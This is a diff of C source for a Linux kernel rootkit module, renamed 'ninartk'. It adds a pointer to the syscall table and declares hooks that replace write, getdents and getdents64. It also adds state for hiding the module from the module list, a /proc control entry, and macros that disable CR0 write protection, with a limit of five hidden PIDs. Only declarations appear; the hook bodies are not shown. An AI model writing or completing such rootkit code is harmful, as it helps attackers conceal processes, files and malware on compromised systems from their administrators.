@@ -10,19 +10,9 @@
 #include <linux/fs.h>
 #include <linux/slab.h>     /* kmalloc */
 
-/* WTF, it compiles without these */
-// #include <linux/unistd.h>
-// #include <asm/uaccess.h>
-// #include <asm/paravirt.h>
-//#include <linux/proc_ns.h>
-//#include <linux/spinlock.h>
-//#include <linux/atomic.h>
-//#include <linux/binfmts.h>
-//#include <linux/cred.h>
-
 MODULE_LICENSE("GPL");
 
-#define MODULE_NAME "ker_mod"
+#define MODULE_NAME "ninartk"
 #define MAX_HIDDEN_PIDS 5
 #define MAX_PID_LENGTH 6
 
@@ -37,6 +27,18 @@ MODULE_LICENSE("GPL");
 
 #define GPF_DISABLE() write_cr0(read_cr0() & (~0x10000))
 #define GPF_ENABLE() write_cr0(read_cr0() | 0x10000)
+
+static struct proc_dir_entry *proc_rtkit;
+static struct proc_dir_entry *proc_root;
+
+static char module_hidden = 0;
+static struct list_head *module_previous;
+static struct list_head *module_kobj_previous;
+
+static int temp;
+static char desc[50];
+
+unsigned long* syscall_table;
 
 /* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
 struct proc_dir_entry {
@@ -69,6 +71,33 @@ struct linux_dirent {
 	char d_name[1];
 };
 
+asmlinkage long (*original_write)(unsigned int,
+                                  const char __user *,
+                                  size_t);
+asmlinkage long (*original_getdents64)(unsigned int,
+                                	   struct linux_dirent64 __user *,
+                                	   unsigned int);
+
+asmlinkage long (*original_getdents)(unsigned int,
+                                	 struct linux_dirent __user *,
+                                	 unsigned int);
+
+asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s);
+asmlinkage long custom_getdents64(unsigned int fd,
+								  struct linux_dirent64 __user *dirp,
+								  unsigned int count);
+asmlinkage long custom_getdents(unsigned int fd,
+								struct linux_dirent __user *dirp,
+								unsigned int count);
 static int procfs_init(void);
+static void procfs_clean(void);
+static ssize_t rtkit_read(struct file *file, char __user *buffer,
+													size_t count, loff_t *ppos);
+static ssize_t rtkit_write(struct file *file, const char __user *buffer,
+													size_t count, loff_t *ppos);
+static unsigned long **get_syscall_table(void);
+
 void module_hide(void);
 void module_show(void);
+static int __init rootkit_init(void);
+static void __exit rootkit_exit(void);
